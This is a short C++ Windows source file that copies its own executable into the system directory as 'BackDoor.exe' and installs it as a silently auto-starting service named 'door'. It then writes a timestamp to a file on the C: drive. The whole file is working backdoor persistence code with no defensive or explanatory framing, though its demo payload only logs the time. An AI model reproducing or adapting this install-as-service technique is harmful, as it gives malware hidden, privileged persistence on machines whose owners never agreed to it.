// ServiceRun.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>
#include <stdio.h>

int main(int argc, char* argv[])
{
    char szFileName[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, szFileName, MAX_PATH);

    SC_HANDLE scHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

    SC_HANDLE scHandleOpen = OpenService(scHandle, "door", SERVICE_ALL_ACCESS);

    if ( scHandleOpen == NULL )
    {
        char szSelfFile[MAX_PATH] = { 0 };
        char szSystemPath[MAX_PATH] = { 0 };
        
        GetSystemDirectory(szSystemPath, MAX_PATH);
        strcat(szSystemPath, "\\BackDoor.exe");
        
        GetModuleFileName(NULL, szSelfFile, MAX_PATH);
        
        CopyFile(szSelfFile, szSystemPath, FALSE);

        SC_HANDLE scNewHandle = CreateService(scHandle,
                                              "door",
                                              "door",
                                              SERVICE_ALL_ACCESS,
                                              SERVICE_WIN32_OWN_PROCESS,
                                              SERVICE_AUTO_START,
                                              SERVICE_ERROR_IGNORE,
                                              szSystemPath,
                                              NULL,
                                              NULL,
                                              NULL,
                                              NULL,
                                              NULL);
        
        StartService(scNewHandle, 0, NULL);

        CloseServiceHandle(scNewHandle);
        MessageBox(NULL, "service run", "door", MB_OK);
    }

    CloseServiceHandle(scHandleOpen);
    CloseServiceHandle(scHandle);

    FILE *pFile = fopen("c:\\a.txt", "wa");

    SYSTEMTIME st; 
    GetSystemTime(&st);
    
    char szTime[MAXBYTE] = { 0 };
    wsprintf(szTime, "%d:%d:%d", st.wHour, st.wMinute, st.wSecond);

    fputs(szTime, pFile);

    fclose(pFile);

    return 0;
}
